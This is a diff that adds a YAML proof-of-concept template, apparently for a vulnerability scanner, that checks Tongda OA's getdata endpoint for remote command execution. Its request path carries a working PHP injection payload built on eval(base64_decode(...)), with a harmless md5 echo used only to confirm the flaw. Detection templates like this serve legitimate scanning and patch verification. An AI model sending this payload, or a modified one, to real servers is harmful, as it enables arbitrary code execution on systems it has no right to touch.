@@ -1,0 +1,16 @@
+id: poc-yaml-tongda-oa-getdata-rce
+info:
+  name: 通达OA-getdata-任意命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 通达OA
+variables:
+  v1: random_str(8)
+  v2: base64(concat("echo md5('",v1,"');"))
+requests:
+- method: GET
+  path: /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{.v2}}%22)))%3B/*&id=19&module=Carouselimage
+  expression: status_code == 200 && contains(body, md5(v1)) && !contains(body, "<")
+transport: http
